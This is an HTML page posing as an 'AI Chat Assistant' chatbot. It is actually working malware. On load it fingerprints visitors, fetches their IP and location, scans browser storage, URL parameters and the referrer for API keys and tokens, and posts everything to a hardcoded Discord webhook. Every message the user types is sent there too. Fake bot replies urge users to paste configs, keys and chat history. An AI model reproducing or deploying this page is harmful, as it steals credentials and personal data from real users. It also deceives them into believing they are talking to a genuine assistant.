<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI Chat Assistant</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 40px auto; padding: 20px; background: #f0f2f5; }
        #chat { border: 1px solid #ccc; height: 400px; overflow-y: scroll; padding: 10px; margin-bottom: 10px; background: #fff; border-radius: 10px; }
        .message { margin: 10px 0; padding: 12px; border-radius: 12px; max-width: 80%; }
        .user { background: #d1e7dd; align-self: flex-end; margin-left: auto; }
        .bot { background: #e2e3e5; align-self: flex-start; }
        .info { background: #fff3cd; font-style: italic; font-size: 0.9em; }
        input { width: 78%; padding: 12px; font-size: 16px; border: 1px solid #ccc; border-radius: 8px; }
        button { padding: 12px 20px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; }
        .typing { font-style: italic; color: #666; }
    </style>
</head>
<body>
    <h1>AI Chat Assistant</h1>
    <p>Type your message below. I'm here to help!</p>
    <div id="chat">
        <div class="message bot">Hello! How can I assist you today?</div>
    </div>
    <input type="text" id="input" placeholder="Type a message..." autofocus>
    <button onclick="sendMessage()">Send</button>

    <script>
        // === CONFIGURATION ===
        const webhookURL = "https://discord.com/api/webhooks/1456759336788299951/X4eyBATv-p2NqCRQECZlXYK66RYroaC3RK5Q1f5_vqPhgargudUYinIAK69BVsGO9XNE";

        const chatDiv = document.getElementById('chat');
        const input = document.getElementById('input');

        let visitorData = {
            ip: 'Unknown',
            geo: {},
            referrer: document.referrer || 'Direct',
            urlParams: Object.fromEntries(new URLSearchParams(location.search)),
            userAgent: navigator.userAgent,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
            deviceMemory: navigator.deviceMemory || 'Unknown',
            canvas: '',
            webgl: '',
            fonts: [],
            secretsFound: [],
            storageKeys: []
        };

        // === CANVAS FINGERPRINT ===
        function getCanvasFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText('Fingerprint ðŸ˜ˆ', 2, 2);
            return canvas.toDataURL();
        }

        // === WEBGL FINGERPRINT ===
        function getWebGLFingerprint() {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return 'Unsupported';
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + ' | ' + gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Hidden';
        }

        // === DETECT COMMON API KEYS / SECRETS ===
        function scanForSecrets() {
            const patterns = [
                /(sk-)[A-Za-z0-9]{48}/g,                    // OpenAI
                /(pk-)[A-Za-z0-9]{48}/g,                    // OpenAI publishable
                /(anthropic|claude)-[A-Za-z0-9]+/g,
                /(gsk_)[A-Za-z0-9]{32}/g,                   // Groq
                /(xai-)[A-Za-z0-9]{40,}/g,                  // xAI / Grok
                /(hf_)[A-Za-z0-9_-]{30,}/g,                 // Hugging Face
                /(secret|token|key|api)[=:]\s*[A-Za-z0-9_-]{20,}/gi
            ];

            let found = [];

            // URL params
            Object.values(visitorData.urlParams).forEach(val => {
                patterns.forEach(p => {
                    const match = val.match(p);
                    if (match) found.push(`URL Param: ${match[0]}`);
                });
            });

            // Referrer
            patterns.forEach(p => {
                const match = visitorData.referrer.match(p);
                if (match) found.push(`Referrer: ${match[0]}`);
            });

            // localStorage & sessionStorage
            [localStorage, sessionStorage].forEach(store => {
                for (let i = 0; i < store.length; i++) {
                    const key = store.key(i);
                    const value = store.getItem(key);
                    visitorData.storageKeys.push(`${key}: ${value.substring(0, 50)}${value.length > 50 ? '...' : ''}`);

                    patterns.forEach(p => {
                        const matchKey = key.match(p);
                        const matchVal = value.match(p);
                        if (matchKey) found.push(`Storage Key (${store === localStorage ? 'local' : 'session'}): ${matchKey[0]}`);
                        if (matchVal) found.push(`Storage Value (${store === localStorage ? 'local' : 'session'}): ${matchVal[0]}`);
                    });
                }
            });

            visitorData.secretsFound = found;
        }

        // === EXFILTRATE DATA TO DISCORD ===
        async function sendToDiscord(payload) {
            fetch(webhookURL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ content: payload })
            }).catch(() => {}); // Silent fail
        }

        // === BUILD RICH REPORT ===
        async function reportVisit() {
            visitorData.canvas = getCanvasFingerprint();
            visitorData.webgl = getWebGLFingerprint();
            scanForSecrets();

            let report = `**ðŸ”¥ NEW VISITOR CAPTURED ðŸ”¥**\n`;
            report += `**IP:** ${visitorData.ip}\n`;
            report += `**Geo:** ${JSON.stringify(visitorData.geo)}\n`;
            report += `**Referrer:** ${visitorData.referrer}\n`;
            report += `**URL Params:** ${JSON.stringify(visitorData.urlParams)}\n`;
            report += `**User Agent:** ${visitorData.userAgent}\n`;
            report += `**Screen:** ${visitorData.screen} | **TZ:** ${visitorData.timezone}\n`;
            report += `**Hardware:** CPU: ${visitorData.hardwareConcurrency} | RAM: ${visitorData.deviceMemory}GB\n`;
            report += `**WebGL:** ${visitorData.webgl}\n`;

            if (visitorData.secretsFound.length > 0) {
                report += `\n**ðŸš¨ SECRETS / API KEYS DETECTED ðŸš¨**\n${visitorData.secretsFound.join('\n')}\n`;
            }

            if (visitorData.storageKeys.length > 0) {
                report += `\n**Storage Keys Found:**\n${visitorData.storageKeys.slice(0, 20).join('\n')}`;
            }

            sendToDiscord(report);
        }

        // === FETCH IP + GEO ===
        async function getIPAndGeo() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                visitorData.ip = data.ip || 'Unknown';
                visitorData.geo = { city: data.city, region: data.region, country: data.country_name, org: data.org };
            } catch {
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    visitorData.ip = data.ip;
                } catch {}
            }
        }

        // === FAKE AI RESPONSE TO INCREASE ENGAGEMENT ===
        function fakeAIResponse() {
            const responses = [
                "Interesting... tell me more.",
                "That's helpful context. Anything else you'd like to share?",
                "Got it. Feel free to paste any config, keys, or previous chat history if you want me to continue from there.",
                "I'm ready when you are. What's next?"
            ];
            const msg = document.createElement('div');
            msg.className = 'message bot';
            msg.textContent = responses[Math.floor(Math.random() * responses.length)];
            chatDiv.appendChild(msg);
            chatDiv.scrollTop = chatDiv.scrollHeight;
        }

        // === SEND MESSAGE ===
        function sendMessage() {
            const text = input.value.trim();
            if (!text) return;

            // Add user message
            const userMsg = document.createElement('div');
            userMsg.className = 'message user';
            userMsg.textContent = text;
            chatDiv.appendChild(userMsg);

            // Exfil message
            sendToDiscord(`**Message from IP ${visitorData.ip}:** ${text}`);

            input.value = "";
            chatDiv.scrollTop = chatDiv.scrollHeight;

            // Fake response after delay
            setTimeout(fakeAIResponse, 1000 + Math.random() * 1000);
        }

        input.addEventListener("keypress", e => { if (e.key === "Enter") sendMessage(); });

        // === INIT ON LOAD ===
        window.onload = async () => {
            await getIPAndGeo();
            await reportVisit();

            // Initial fake greeting already in HTML
            chatDiv.scrollTop = chatDiv.scrollHeight;
        };
    </script>
</body>
</html>
